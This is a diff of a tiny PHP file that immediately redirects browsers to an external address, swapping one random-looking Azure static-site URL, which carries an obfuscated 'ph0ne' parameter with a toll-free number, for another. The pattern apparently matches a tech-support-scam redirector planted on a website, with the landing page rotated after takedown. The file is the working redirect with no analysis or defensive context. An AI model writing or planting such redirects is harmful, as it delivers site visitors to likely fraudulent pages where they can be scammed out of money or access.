@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://gfre32wedf.z33.web.core.windows.net/index.html?ph0ne=1-888-850-3257");
+header("Location: https://dj76idhsu7.z6.web.core.windows.net/");
  
 exit;
 ?>
